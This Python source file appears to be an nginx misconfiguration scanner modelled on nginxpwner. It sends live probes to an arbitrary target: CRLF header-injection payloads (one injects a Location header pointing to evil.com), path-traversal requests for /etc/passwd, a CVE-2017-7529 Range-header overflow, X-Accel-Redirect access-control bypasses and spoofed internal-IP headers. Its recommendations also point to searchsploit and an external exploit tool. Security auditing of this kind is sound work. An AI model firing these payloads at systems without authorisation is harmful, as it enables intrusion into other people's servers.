"""
Configuration Audit Collector

Inspired by: nginxpwner
Purpose: Scan for misconfigurations in web servers and services.
"""

import asyncio
import re
from typing import Any, Dict, List, Optional
from datetime import datetime
import httpx
from loguru import logger
from packaging import version as pkg_version
from bs4 import BeautifulSoup

from app.core.dsa import HashMap, MaxHeap


class ConfigAudit:
    """
    Configuration Audit Collector - Full nginxpwner implementation.
    
    Features:
    - Nginx version detection and CVE lookup
    - Comprehensive CRLF injection testing
    - Path traversal detection (merge_slashes, alias)
    - PURGE method testing
    - Variable leakage detection
    - Hop-by-hop headers testing
    - X-Accel-Redirect bypass testing
    - PHP detection
    - CVE-2017-7529 testing
    - Security header analysis
    
    DSA Usage:
    - HashMap: Signature matching
    - MaxHeap: Severity-based finding prioritization
    """
    
    # Security headers to check
    SECURITY_HEADERS = {
        'Strict-Transport-Security': {'required': True, 'severity': 'high'},
        'X-Content-Type-Options': {'required': True, 'severity': 'medium'},
        'X-Frame-Options': {'required': True, 'severity': 'medium'},
        'X-XSS-Protection': {'required': False, 'severity': 'low'},
        'Content-Security-Policy': {'required': True, 'severity': 'high'},
        'Referrer-Policy': {'required': False, 'severity': 'low'},
        'Permissions-Policy': {'required': False, 'severity': 'low'},
    }
    
    # Common paths for testing
    COMMON_PATHS = [
        'static', 'images', 'assets', 'css', 'js', 'uploads', 'files',
        'media', 'public', 'resources', 'content', 'data'
    ]
    
    # Hop-by-hop headers to test
    HOP_BY_HOP_HEADERS = [
        "Proxy-Host", "Request-Uri", "X-Forwarded", "X-Forwarded-By", "X-Forwarded-For",
        "X-Forwarded-For-Original", "X-Forwarded-Host", "X-Forwarded-Server", "X-Forwarder-For",
        "X-Forward-For", "Base-Url", "Http-Url", "Proxy-Url", "Redirect", "Real-Ip", "Referer",
        "Referrer", "Uri", "Url", "X-Host", "X-Http-Destinationurl", "X-Http-Host-Override",
        "X-Original-Remote-Addr", "X-Original-Url", "X-Proxy-Url", "X-Rewrite-Url", "X-Real-Ip",
        "X-Remote-Addr", "X-Proxy-URL", "X-Original-Host", "X-Originally-Forwarded-For",
        "X-Originating-Ip", "X-Ip", "X-Client-Ip"
    ]
    
    def __init__(self):
        """Initialize Config Audit collector."""
        self._signature_map = HashMap()
        self._findings_heap = MaxHeap()
        self._results_cache = HashMap()
        
        # Initialize signatures
        self._init_signatures()
    
    def _init_signatures(self):
        """Initialize vulnerability signatures."""
        severity_scores = {'critical': 10, 'high': 8, 'medium': 5, 'low': 2, 'info': 1}
        
        checks = [
            {'name': 'alias_traversal', 'severity': 'critical'},
            {'name': 'crlf_injection', 'severity': 'high'},
            {'name': 'merge_slashes', 'severity': 'high'},
            {'name': 'purge_method', 'severity': 'medium'},
            {'name': 'variable_leakage', 'severity': 'medium'},
            {'name': 'hop_by_hop', 'severity': 'medium'},
            {'name': 'x_accel_bypass', 'severity': 'high'},
            {'name': 'cve_2017_7529', 'severity': 'high'},
        ]
        
        for check in checks:
            self._signature_map.put(check['name'], {
                **check,
                'score': severity_scores.get(check['severity'], 1)
            })
    
    async def audit(self, target: str, config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """Perform configuration audit on target.
        
        Args:
            target: Target URL or domain
            config: Configuration options for tests
            
        Returns:
            Audit results
        """
        if config is None:
            config = {}
        
        # Default config - enable all tests
        test_config = {
            "crlf": config.get("crlf", True),
            "pathTraversal": config.get("pathTraversal", True),
            "versionDetection": config.get("versionDetection", True),
            "cveLookup": config.get("cveLookup", True),
            "bypassTechniques": config.get("bypassTechniques", True),
            "purgeMethod": config.get("purgeMethod", True),
            "variableLeakage": config.get("variableLeakage", True),
            "hopByHopHeaders": config.get("hopByHopHeaders", True),
            "phpDetection": config.get("phpDetection", True),
            "cve20177529": config.get("cve20177529", True),
            "paths": config.get("paths", [])
        }
        
        logger.info(f"Starting configuration audit for {target} with config: {test_config}")
        
        # Normalize target
        if not target.startswith(('http://', 'https://')):
            target = f"https://{target}"
        
        results = {
            "target": target,
            "timestamp": datetime.utcnow().isoformat(),
            "findings": [],
            "headers_analysis": {},
            "server_info": {},
            "score": 100  # Start with perfect score
        }
        
        async with httpx.AsyncClient(timeout=30.0, follow_redirects=True, verify=False) as client:
            try:
                response = await client.get(target)
                
                # Analyze response
                results["server_info"] = await self._extract_server_info(response, test_config)
                results["headers_analysis"] = self._analyze_headers(response.headers)
                
                # Run all tests based on config
                findings = []
                
                if test_config.get("versionDetection") or test_config.get("cveLookup"):
                    version_findings = await self._check_version_and_cve(client, target, response, test_config)
                    findings.extend(version_findings)
                
                if test_config.get("crlf"):
                    crlf_findings = await self._test_crlf_injection(client, target, test_config)
                    findings.extend(crlf_findings)
                
                if test_config.get("purgeMethod"):
                    purge_findings = await self._test_purge_method(client, target)
                    findings.extend(purge_findings)
                
                if test_config.get("variableLeakage"):
                    var_findings = await self._test_variable_leakage(client, target)
                    findings.extend(var_findings)
                
                if test_config.get("pathTraversal"):
                    path_findings = await self._test_path_traversal(client, target, test_config)
                    findings.extend(path_findings)
                
                if test_config.get("hopByHopHeaders"):
                    hop_findings = await self._test_hop_by_hop_headers(client, target)
                    findings.extend(hop_findings)
                
                if test_config.get("bypassTechniques"):
                    bypass_findings = await self._test_x_accel_bypass(client, target, test_config)
                    findings.extend(bypass_findings)
                
                if test_config.get("phpDetection"):
                    php_findings = await self._detect_php(client, target, response)
                    findings.extend(php_findings)
                
                if test_config.get("cve20177529"):
                    cve_findings = await self._test_cve_2017_7529(client, target)
                    findings.extend(cve_findings)
                
                results["findings"] = findings
                
                # Calculate score
                results["score"] = self._calculate_score(results)
                
            except Exception as e:
                logger.error(f"Audit error for {target}: {e}")
                results["error"] = str(e)
        
        # Cache results
        self._results_cache.put(target, results)
        
        return results
    
    async def _extract_server_info(self, response: httpx.Response, config: Dict[str, Any]) -> Dict[str, Any]:
        """Extract server information from response.
        
        Args:
            response: HTTP response
            config: Test configuration
            
        Returns:
            Server information
        """
        headers = response.headers
        
        server_info = {
            "server": headers.get("server", "unknown"),
            "powered_by": headers.get("x-powered-by"),
            "nginx_version": self._extract_version(headers.get("server", "")),
            "status_code": response.status_code
        }
        
        return server_info
    
    def _extract_version(self, server_header: str) -> Optional[str]:
        """Extract version from server header.
        
        Args:
            server_header: Server header value
            
        Returns:
            Version string or None
        """
        match = re.search(r'nginx/(\d+\.\d+\.\d+)', server_header, re.I)
        if match:
            return match.group(1)
        return None
    
    async def _check_version_and_cve(self, client: httpx.AsyncClient, target: str, 
                                     response: httpx.Response, config: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Check nginx version and look up CVEs.
        
        Args:
            client: HTTP client
            target: Target URL
            response: Initial response
            config: Test configuration
            
        Returns:
            List of findings
        """
        findings = []
        server_header = response.headers.get("server", "")
        nginx_version = self._extract_version(server_header)
        
        if not nginx_version:
            if config.get("versionDetection"):
                findings.append({
                    "check": "version_detection",
                    "description": "Nginx version not found in Server header",
                    "severity": "info",
                    "evidence": "Server header may be hidden or target uses non-standard nginx",
                    "url": target
                })
            return findings
        
        # Fetch latest nginx version from GitHub
        try:
            if config.get("cveLookup"):
                latest_version = await self._get_latest_nginx_version(client)
                
                if latest_version:
                    try:
                        if pkg_version.parse(nginx_version) < pkg_version.parse(latest_version):
                            # Version is outdated
                            cves = await self._lookup_cves(nginx_version)
                            findings.append({
                                "check": "version_outdated",
                                "description": f"Nginx version {nginx_version} is outdated. Latest version is {latest_version}",
                                "severity": "high",
                                "evidence": {
                                    "current_version": nginx_version,
                                    "latest_version": latest_version,
                                    "cves": cves
                                },
                                "url": target,
                                "recommendations": [
                                    f"Upgrade nginx to version {latest_version}",
                                    "Check for CVEs: https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=nginx",
                                    "Review exploit database: searchsploit nginx"
                                ]
                            })
                        else:
                            findings.append({
                                "check": "version_current",
                                "description": f"Nginx version {nginx_version} is up to date",
                                "severity": "info",
                                "evidence": {
                                    "version": nginx_version,
                                    "latest_version": latest_version
                                },
                                "url": target
                            })
                    except Exception as e:
                        logger.debug(f"Version comparison error: {e}")
        except Exception as e:
            logger.debug(f"Version check error: {e}")
        
        return findings
    
    async def _get_latest_nginx_version(self, client: httpx.AsyncClient) -> Optional[str]:
        """Get latest nginx version from GitHub releases.
        
        Args:
            client: HTTP client
            
        Returns:
            Latest version string or None
        """
        try:
            response = await client.get("https://github.com/nginx/nginx/tags", timeout=10.0)
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                # Find first release tag link
                tag_links = soup.find_all('a', href=re.compile(r'/nginx/nginx/releases/tag'))
                if tag_links:
                    href = tag_links[0].get('href', '')
                    # Extract version from href like /nginx/nginx/releases/tag/release-1.25.3
                    match = re.search(r'release-(\d+\.\d+\.\d+)', href)
                    if match:
                        return match.group(1)
        except Exception as e:
            logger.debug(f"Failed to fetch latest nginx version: {e}")
        
        return None
    
    async def _lookup_cves(self, nginx_version: str) -> List[str]:
        """Look up CVEs for nginx version.
        
        Args:
            nginx_version: Nginx version string
            
        Returns:
            List of CVE IDs
        """
        cves = []
        try:
            # Use NVD API to search for CVEs
            # Extract major.minor for broader search
            major_minor = '.'.join(nginx_version.split('.')[:2])
            
            # Try NVD API
            async with httpx.AsyncClient() as client:
                try:
                    # NVD API endpoint
                    url = f"https://services.nvd.nist.gov/rest/json/cves/2.0"
                    params = {
                        "keywordSearch": f"nginx {major_minor}",
                        "resultsPerPage": 10
                    }
                    response = await client.get(url, params=params, timeout=10.0)
                    if response.status_code == 200:
                        data = response.json()
                        if "vulnerabilities" in data:
                            for vuln in data["vulnerabilities"][:10]:
                                if "cve" in vuln:
                                    cves.append(vuln["cve"]["id"])
                except Exception:
                    pass
        except Exception as e:
            logger.debug(f"CVE lookup error: {e}")
        
        # Fallback: return reference to CVE database
        if not cves:
            cves = [f"Check https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=nginx for version {nginx_version}"]
        
        return cves
    
    async def _test_crlf_injection(self, client: httpx.AsyncClient, target: str, 
                                   config: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Test for CRLF injection vulnerabilities.
        
        Args:
            client: HTTP client
            target: Target URL
            config: Test configuration
            
        Returns:
            List of findings
        """
        findings = []
        
        # CRLF payloads to test
        crlf_payloads = [
            "%0d%0aDetectify:%20clrf",
            "%0d%0aSet-Cookie:test=injected",
            "%0aSet-Cookie:test=injected",
            "%0dSet-Cookie:test=injected",
            "%0d%0aLocation:%20http://evil.com",
        ]
        
        # Test base URL
        for payload in crlf_payloads:
            try:
                test_url = f"{target.rstrip('/')}/{payload}"
                response = await client.get(test_url, timeout=10.0)
                
                # Check if CRLF was injected into headers
                headers_lower = {k.lower(): v for k, v in response.headers.items()}
                
                if 'detectify' in headers_lower:
                    findings.append({
                        "check": "crlf_injection",
                        "description": "CRLF injection found via URI parameter",
                        "severity": "high",
                        "evidence": f"CRLF injection successful with payload: {payload}",
                        "url": test_url,
                        "recommendations": [
                            "Avoid using $uri or $document_uri in redirects",
                            "Sanitize user input in nginx configuration",
                            "If 401/403 found, test X-Accel-Redirect header injection"
                        ]
                    })
                    break  # Found one, no need to test more
                
                if 'set-cookie' in headers_lower and 'test=injected' in headers_lower.get('set-cookie', ''):
                    findings.append({
                        "check": "crlf_injection",
                        "description": "CRLF injection found - Set-Cookie header injection",
                        "severity": "high",
                        "evidence": f"CRLF injection successful with payload: {payload}",
                        "url": test_url,
                        "recommendations": [
                            "Avoid using $uri or $document_uri in redirects",
                            "Sanitize user input in nginx configuration"
                        ]
                    })
                    break
            except Exception as e:
                logger.debug(f"CRLF test error for {payload}: {e}")
        
        # Test CRLF on provided paths
        paths_to_test = config.get("paths", [])
        if not paths_to_test:
            paths_to_test = self.COMMON_PATHS
        
        for path in paths_to_test[:10]:  # Limit to 10 paths
            try:
                test_url = f"{target.rstrip('/')}/{path}%0d%0aDetectify:%20clrf"
                response = await client.get(test_url, timeout=10.0)
                
                headers_lower = {k.lower(): v for k, v in response.headers.items()}
                if 'detectify' in headers_lower:
                    findings.append({
                        "check": "crlf_injection",
                        "description": f"CRLF injection found on path: {path}",
                        "severity": "high",
                        "evidence": f"CRLF injection successful on path {path}",
                        "url": test_url,
                        "recommendations": [
                            "Review nginx configuration for path handling",
                            "Sanitize path variables in nginx config"
                        ]
                    })
                    break  # Found one on a path
            except Exception:
                pass
        
        return findings
    
    async def _test_purge_method(self, client: httpx.AsyncClient, target: str) -> List[Dict[str, Any]]:
        """Test if PURGE HTTP method is available.
        
        Args:
            client: HTTP client
            target: Target URL
            
        Returns:
            List of findings
        """
        findings = []
        
        try:
            # Test PURGE method
            response = await client.request("PURGE", f"{target.rstrip('/')}/*", timeout=10.0)
            
            if response.status_code == 204:
                findings.append({
                    "check": "purge_method",
                    "description": "PURGE HTTP method is accessible - cache purging possible",
                    "severity": "medium",
                    "evidence": "PURGE method returned 204 status code",
                    "url": target,
                    "recommendations": [
                        "Restrict PURGE method to internal IPs only",
                        "Implement authentication for PURGE requests",
                        "Consider disabling PURGE method if not needed"
                    ]
                })
        except Exception as e:
            logger.debug(f"PURGE method test error: {e}")
        
        return findings
    
    async def _test_variable_leakage(self, client: httpx.AsyncClient, target: str) -> List[Dict[str, Any]]:
        """Test for nginx variable leakage.
        
        Args:
            client: HTTP client
            target: Target URL
            
        Returns:
            List of findings
        """
        findings = []
        
        # Test Referer header variable leakage
        try:
            test_url = f"{target.rstrip('/')}/foo$http_referer"
            headers = {"Referer": "bar"}
            response = await client.get(test_url, headers=headers, timeout=10.0)
            
            if "foobar" in response.text:
                findings.append({
                    "check": "variable_leakage",
                    "description": "Nginx variable leakage found via Referer header",
                    "severity": "medium",
                    "evidence": "Variable $http_referer is reflected in response",
                    "url": test_url,
                    "recommendations": [
                        "Review nginx configuration for variable usage",
                        "Test other variables: $realpath_root, $nginx_version, $document_root",
                        "Avoid reflecting nginx variables in responses"
                    ]
                })
        except Exception as e:
            logger.debug(f"Variable leakage test error: {e}")
        
        return findings
    
    async def _test_path_traversal(self, client: httpx.AsyncClient, target: str, 
                                   config: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Test for path traversal vulnerabilities.
        
        Args:
            client: HTTP client
            target: Target URL
            config: Test configuration
            
        Returns:
            List of findings
        """
        findings = []
        
        # Get baseline response
        try:
            baseline = await client.get(target, timeout=10.0)
            baseline_status = baseline.status_code
            baseline_length = len(baseline.text)
        except Exception:
            baseline_status = None
            baseline_length = None
        
        # Test merge_slashes
        merge_slashes_tests = [
            "///",
            "//////",
            "///../../../../../etc/passwd",
            "//////../../../../../../etc/passwd",
            "///../../../../../win.ini",
            "//////../../../../../../win.ini",
        ]
        
        for test_path in merge_slashes_tests:
            try:
                test_url = f"{target.rstrip('/')}{test_path}"
                response = await client.get(test_url, timeout=10.0)
                
                # Check if merge_slashes is off (same response as baseline)
                if baseline_status and baseline_length:
                    if response.status_code == baseline_status and len(response.text) == baseline_length:
                        findings.append({
                            "check": "merge_slashes",
                            "description": "merge_slashes may be set to off",
                            "severity": "high",
                            "evidence": f"Response identical to baseline for path: {test_path}",
                            "url": test_url,
                            "recommendations": [
                                "Enable merge_slashes in nginx configuration",
                                "This is useful if LFI is found"
                            ]
                        })
                        break
                
                # Check for path traversal success
                if response.status_code == 200:
                    content_lower = response.text.lower()
                    if 'root:' in content_lower or 'bin/bash' in content_lower or '[extensions]' in content_lower:
                        findings.append({
                            "check": "path_traversal",
                            "description": f"Path traversal vulnerability found: {test_path}",
                            "severity": "critical",
                            "evidence": f"Path traversal successful - file system access detected",
                            "url": test_url,
                            "recommendations": [
                                "Enable merge_slashes in nginx configuration",
                                "Review alias directive configurations",
                                "Restrict file system access"
                            ]
                        })
                        break
            except Exception:
                pass
        
        # Test alias traversal
        paths_to_test = config.get("paths", [])
        if not paths_to_test:
            paths_to_test = self.COMMON_PATHS
        
        for path in paths_to_test[:10]:
            alias_tests = [
                f"/{path}../etc/passwd",
                f"/{path}../../etc/passwd",
                f"/{path}../../../etc/passwd",
            ]
            
            for alias_test in alias_tests:
                try:
                    test_url = f"{target.rstrip('/')}{alias_test}"
                    response = await client.get(test_url, timeout=10.0)
                    
                    if response.status_code == 200:
                        content_lower = response.text.lower()
                        if 'root:' in content_lower or 'bin/bash' in content_lower:
                            findings.append({
                                "check": "alias_traversal",
                                "description": f"Alias path traversal found: {alias_test}",
                                "severity": "critical",
                                "evidence": f"Alias misconfiguration allows path traversal",
                                "url": test_url,
                                "recommendations": [
                                    "Review alias directive in nginx configuration",
                                    "Ensure alias paths are properly secured",
                                    "Use root directive instead of alias where possible"
                                ]
                            })
                            break
                except Exception:
                    pass
        
        return findings
    
    async def _test_hop_by_hop_headers(self, client: httpx.AsyncClient, target: str) -> List[Dict[str, Any]]:
        """Test hop-by-hop headers for SSRF/IP spoofing.
        
        Args:
            client: HTTP client
            target: Target URL
            
        Returns:
            List of findings
        """
        findings = []
        
        # Get baseline
        try:
            baseline = await client.get(target, timeout=10.0)
            baseline_status = baseline.status_code
            baseline_length = len(baseline.text)
        except Exception:
            return findings
        
        # Test IPs
        test_ips = {
            "127.0.0.1": "127.0.0.1",
            "localhost": "localhost",
            "192.168.1.1": "192.168.1.1",
            "10.0.0.1": "10.0.0.1"
        }
        
        differences_found = []
        
        for ip_name, ip_value in test_ips.items():
            for header in self.HOP_BY_HOP_HEADERS[:10]:  # Limit to 10 headers per IP
                try:
                    headers = {header: ip_value}
                    response = await client.get(target, headers=headers, timeout=10.0)
                    
                    # Check for differences
                    status_diff = response.status_code != baseline_status
                    length_diff = abs(len(response.text) - baseline_length) > 20
                    
                    if status_diff or length_diff:
                        differences_found.append({
                            "header": header,
                            "ip": ip_value,
                            "status_diff": status_diff,
                            "length_diff": length_diff
                        })
                except Exception:
                    pass
        
        if differences_found:
            findings.append({
                "check": "hop_by_hop_headers",
                "description": "Hop-by-hop headers cause response differences - possible SSRF/IP spoofing",
                "severity": "medium",
                "evidence": {
                    "differences": differences_found[:5]  # Limit to 5 examples
                },
                "url": target,
                "recommendations": [
                    "Review nginx configuration for header handling",
                    "Validate and sanitize forwarded headers",
                    "Restrict internal IP access"
                ]
            })
        
        return findings
    
    async def _test_x_accel_bypass(self, client: httpx.AsyncClient, target: str, 
                                  config: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Test X-Accel-Redirect bypass for 401/403.
        
        Args:
            client: HTTP client
            target: Target URL
            config: Test configuration
            
        Returns:
            List of findings
        """
        findings = []
        
        # Find paths that return 401/403
        paths_to_test = config.get("paths", [])
        if not paths_to_test:
            paths_to_test = self.COMMON_PATHS
        
        unauthorized_paths = []
        
        for path in paths_to_test[:20]:  # Limit to 20 paths
            try:
                test_url = f"{target.rstrip('/')}/{path}"
                response = await client.get(test_url, timeout=10.0)
                
                if response.status_code in [401, 403]:
                    unauthorized_paths.append((path, response.status_code))
            except Exception:
                pass
        
        # Test X-Accel-Redirect bypass
        for path, original_status in unauthorized_paths[:5]:  # Limit to 5 paths
            try:
                # Test with X-Accel-Redirect header
                headers = {"X-Accel-Redirect": f"/{path}"}
                bypass_url = f"{target.rstrip('/')}/randompath"
                response = await client.get(bypass_url, headers=headers, timeout=10.0)
                
                if response.status_code != original_status:
                    findings.append({
                        "check": "x_accel_bypass",
                        "description": f"X-Accel-Redirect bypass found for path: {path}",
                        "severity": "high",
                        "evidence": {
                            "path": path,
                            "original_status": original_status,
                            "bypass_status": response.status_code
                        },
                        "url": bypass_url,
                        "recommendations": [
                            "Restrict X-Accel-Redirect header usage",
                            "Validate internal redirect paths",
                            "Implement proper access controls"
                        ]
                    })
                    break  # Found one bypass
            except Exception:
                pass
        
        return findings
    
    async def _detect_php(self, client: httpx.AsyncClient, target: str, 
                          response: httpx.Response) -> List[Dict[str, Any]]:
        """Detect PHP usage.
        
        Args:
            client: HTTP client
            target: Target URL
            response: Initial response
            
        Returns:
            List of findings
        """
        findings = []
        php_detected = False
        detection_methods = []
        
        # Check 1: /index.php
        try:
            php_response = await client.get(f"{target.rstrip('/')}/index.php", timeout=10.0)
            if php_response.status_code == 200:
                php_detected = True
                detection_methods.append("index.php returns 200")
        except Exception:
            pass
        
        # Check 2: PHPSESSID cookie
        if 'PHPSESSID' in response.cookies:
            php_detected = True
            detection_methods.append("PHPSESSID cookie present")
        
        # Check 3: Server header
        server_header = response.headers.get("server", "").lower()
        if "php" in server_header:
            php_detected = True
            detection_methods.append("PHP in Server header")
        
        # Check 4: X-Powered-By header
        powered_by = response.headers.get("x-powered-by", "").lower()
        if "php" in powered_by:
            php_detected = True
            detection_methods.append("PHP in X-Powered-By header")
        
        if php_detected:
            findings.append({
                "check": "php_detection",
                "description": "PHP usage detected",
                "severity": "info",
                "evidence": {
                    "detection_methods": detection_methods
                },
                "url": target,
                "recommendations": [
                    "Review nginx PHP-FastCGI configuration",
                    "Check for script_name misconfiguration: https://book.hacktricks.xyz/pentesting/pentesting-web/nginx#script_name",
                    "Test for CVE-2019-11043 if using PHP-FPM",
                    "If file upload exists, test FastCGI directive misconfiguration"
                ]
            })
        
        return findings
    
    async def _test_cve_2017_7529(self, client: httpx.AsyncClient, target: str) -> List[Dict[str, Any]]:
        """Test for CVE-2017-7529 (integer overflow in range filter).
        
        Args:
            client: HTTP client
            target: Target URL
            
        Returns:
            List of findings
        """
        findings = []
        
        try:
            # Get initial response
            response = await client.get(target, timeout=10.0)
            content_length = int(response.headers.get('Content-Length', 0))
            
            if content_length > 0:
                # Calculate malicious range
                bytes_length = content_length + 623
                range_value = f"bytes=-{bytes_length},-9223372036854{776000 - bytes_length}"
                
                # Test with malicious range header
                headers = {'Range': range_value}
                test_response = await client.get(target, headers=headers, timeout=10.0)
                
                if test_response.status_code == 206 and 'Content-Range' in test_response.text:
                    findings.append({
                        "check": "cve_2017_7529",
                        "description": "Vulnerable to CVE-2017-7529 (integer overflow in range filter)",
                        "severity": "high",
                        "evidence": "Range header manipulation successful",
                        "url": target,
                        "recommendations": [
                            "Upgrade nginx to version 1.13.2 or later",
                            "Use exploit tool: https://github.com/souravbaghz/Scanginx/blob/master/dumper.py",
                            "Review nginx range filter module configuration"
                        ]
                    })
        except Exception as e:
            logger.debug(f"CVE-2017-7529 test error: {e}")
        
        return findings
    
    def _analyze_headers(self, headers: httpx.Headers) -> Dict[str, Any]:
        """Analyze security headers.
        
        Args:
            headers: Response headers
            
        Returns:
            Headers analysis
        """
        analysis = {
            "present": [],
            "missing": [],
            "issues": []
        }
        
        for header, config in self.SECURITY_HEADERS.items():
            header_value = headers.get(header)
            
            if header_value:
                analysis["present"].append({
                    "header": header,
                    "value": header_value
                })
            elif config['required']:
                analysis["missing"].append({
                    "header": header,
                    "severity": config['severity'],
                    "recommendation": f"Add {header} header"
                })
        
        return analysis
    
    def _calculate_score(self, results: Dict[str, Any]) -> int:
        """Calculate security score.
        
        Args:
            results: Audit results
            
        Returns:
            Score 0-100
        """
        score = 100
        
        # Deduct for missing headers
        for missing in results.get("headers_analysis", {}).get("missing", []):
            if missing['severity'] == 'high':
                score -= 15
            elif missing['severity'] == 'medium':
                score -= 10
            else:
                score -= 5
        
        # Deduct for vulnerabilities
        for finding in results.get("findings", []):
            if finding['severity'] == 'critical':
                score -= 30
            elif finding['severity'] == 'high':
                score -= 20
            elif finding['severity'] == 'medium':
                score -= 10
            else:
                score -= 5
        
        return max(0, score)
    
    def get_top_findings(self, n: int = 10) -> List[Dict[str, Any]]:
        """Get top N findings by severity.
        
        Args:
            n: Number of findings
            
        Returns:
            Top findings
        """
        return self._findings_heap.get_top_n(n)
    
    def stats(self) -> Dict[str, Any]:
        """Get collector statistics."""
        return {
            "checks_available": len(self.HOP_BY_HOP_HEADERS) + len(self.COMMON_PATHS),
            "cached_audits": len(self._results_cache),
            "total_findings": len(self._findings_heap)
        }
